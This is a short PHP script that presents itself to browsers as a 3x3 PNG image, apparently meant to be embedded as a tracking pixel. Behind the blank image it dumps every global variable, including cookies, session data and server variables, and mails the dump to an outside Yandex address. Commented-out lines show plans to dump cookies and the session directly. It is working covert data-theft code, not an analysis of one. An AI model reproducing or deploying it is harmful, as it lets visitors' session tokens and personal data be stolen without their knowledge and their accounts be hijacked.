<?
header("Content-type: image/png");
$im = imagecreate(3, 3)
    or die("Cannot Initialize new GD image stream");
$background_color = imagecolorallocate($im, 255, 255, 255);
$text_color = imagecolorallocate($im, 20, 20, 120);
//$addr = $_SERVER['HTTP_REFERER'];
$addr='Проба: '.$account.'+'.$post_id;
$ref = $_SERVER['HTTP_REFERER'];
//$addr = utf8_decode( $addr );
//$addr = convert_cyr_string( $addr, 'i', 'w' );
//imagestring($im, 10, 10, 7, $addr, $text_color);
ob_start();
//phpinfo();
/*
foreach($_SESSION as $key => $val){
		echo 'SESSION: '.$key.' = > '.$val.'<br />';
	}
	
foreach($_COOKIE as $key => $val){
		echo 'COOKIE: '.$key.' = > '.$val.'<br />';
	}
*/

while (list($var,$value)=each($GLOBALS))
{
	if(is_array($value)){
		echo "<br>$var =><pre>";
		print_r($value);
		echo "</pre>";
	}else{
		echo "<br>$var => $value";
	}
} 

$pinfo=ob_get_clean();
$headers = "Content-type: text/html;\n".
	"From: droden@narod.ru\n". 
	"X-Mailer: PHP/".phpversion()."\n". 
	"Date: ".date("r")."\n". 
	"Reply-To: droden@yandex.ru\n\n"; 
mail("den-dr@yandex.ru", "Lepra3", $pinfo, $headers);
//imagettftext ($im, 20, 0, 10, 50, $text_color, "CALIBRI.TTF", $addr);
//imagettftext ($im, 20, 0, 10, 100, $text_color, "CALIBRI.TTF", $ref);
imagepng($im);
imagedestroy($im);
?>